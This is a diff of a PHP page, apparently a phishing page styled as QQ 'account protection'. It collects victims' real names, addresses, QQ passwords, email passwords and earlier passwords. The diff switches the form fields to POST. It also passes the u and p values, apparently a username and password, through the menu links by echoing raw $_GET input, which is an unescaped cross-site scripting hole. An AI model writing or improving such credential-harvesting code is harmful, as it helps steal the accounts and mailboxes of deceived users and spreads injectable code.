@@ -6,13 +6,13 @@
 		echo "<script>alert('无权访问');window.location.href='index.php'</script>";
 	}
 
-	$trueName=$_GET['txtName'];
-	$addr=$_GET['txtAddress'];
-	$anotherQQ=$_GET['txtContactQQ'];
-	$password=$_GET['txtContactQQPW'];
-	$reciveType=$_GET['radiobutton'];
-	$reciveMail=$_GET['txtContactEmail'];
-	$reciveMailPassword=$_GET['yxmm'];
+	$trueName=$_POST['txtName'];
+	$addr=$_POST['txtAddress'];
+	$anotherQQ=$_POST['txtContactQQ'];
+	$password=$_POST['txtContactQQPW'];
+	$reciveType=$_POST['radiobutton'];
+	$reciveMail=$_POST['txtContactEmail'];
+	$reciveMailPassword=$_POST['yxmm'];
 	$historyPw1=$_POST['history_pwd_1_password'];
 	$historyPw2=$_POST['pwdOldPW2'];
 	$historyPw3=$_POST['pwdOldPW3'];
@@ -83,7 +83,7 @@
     
     	<div id="menu">
         	<ul>
-            <li id="menu_index"><a onfocus="this.blur()" class="m1" href=""><cite>
+            <li id="menu_index"><a onfocus="this.blur()" class="m1" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>"><cite>
 			首页</cite></a></li>
             <li id="menu_account_prot"><a onfocus="this.blur()" class="m2" href="cn2.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onmouseover="ShowSubMenu('submenu_account_prot');" onmouseout="HideSubMenu('submenu_account_prot');"><cite>
 			帐号保护</cite></a></li>
